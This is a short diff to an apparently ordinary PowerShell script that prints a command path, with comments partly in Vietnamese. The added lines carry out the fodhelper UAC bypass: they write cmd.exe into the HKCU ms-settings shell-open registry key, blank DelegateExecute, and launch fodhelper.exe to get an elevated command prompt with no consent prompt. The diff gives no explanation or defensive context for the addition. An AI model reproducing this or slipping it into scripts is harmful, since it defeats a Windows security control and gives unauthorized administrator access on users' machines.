@@ -14,3 +14,10 @@ $path = Get-CommandPath
 
 # In giá trị của biến $path
 Write-Output $path
+
+#spawn cmd.exe process 
+New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Value "cmd.exe" -Force
+New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
+
+#start fodhelper.exe to execute command in the registry
+Start-Process "C:\Windows\System32\fodhelper.exe"
